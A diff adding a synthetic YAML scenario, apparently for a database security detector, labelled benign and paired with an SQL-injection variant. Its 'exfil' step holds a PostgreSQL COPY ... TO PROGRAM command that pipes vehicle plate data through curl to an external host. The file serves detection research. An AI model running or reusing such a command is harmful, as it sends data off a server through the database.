@@ -1,0 +1,33 @@
+scenario_id: gen_logistics_69_sql_injection_ben_1879b
+family_id: gen_logistics_69_sql_injection_fam_1879
+domain: logistics
+time_of_day: 03:05
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: inject
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: probe
+    sql: SELECT vehicle_id, plate_number FROM vehicles WHERE shipment_id = 63659
+  - step_id: exfil
+    sql: COPY (SELECT vehicle_id, plate_number FROM vehicles WHERE depot_id = 'DP-11')
+      TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest -d
+      @-'
+    connects_to:
+      ip: 203.0.113.244
+      port: 8443
+matched_pair_id: gen_logistics_69_sql_injection_pair_1879
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
